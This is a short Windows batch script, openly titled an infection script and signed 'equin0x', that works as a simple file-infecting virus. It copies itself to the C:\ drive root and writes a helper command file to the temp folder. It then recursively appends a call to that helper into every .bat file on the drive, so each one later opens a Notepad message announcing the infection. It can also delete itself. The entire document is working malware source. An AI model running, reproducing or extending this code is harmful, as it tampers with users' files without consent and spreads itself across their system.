::Simple batch file infection script
::VAR
SET DELONEXIT=0
SET DIR=C:\
::START
@ECHO OFF
CD %DIR%
COPY %0 %DIR%
IF EXIST %TEMP%\RUNDLL.CMD DEL %TEMP%\RUNDLL.CMD
IF EXIST %TEMP%\INF.TXT DEL %TEMP%\INF.TXT
ECHO @ECHO OFF >> %TEMP%\RUNDLL.CMD
ECHO START NOTEPAD.EXE %TEMP%\INF.TXT >> %TEMP%\RUNDLL.CMD
ECHO This file has been infected by equin0x. > %TEMP%\INF.TXT
for /f %%A in ('DIR /B /S *.bat') do (
		if not "%%A"=="%0" ECHO CALL %TEMP%\RUNDLL.CMD >> %%A
)
::END
IF "%DELONEXIT%"=="1" DEL %0
IF NOT "%DELONEXIT%"=="1" EXIT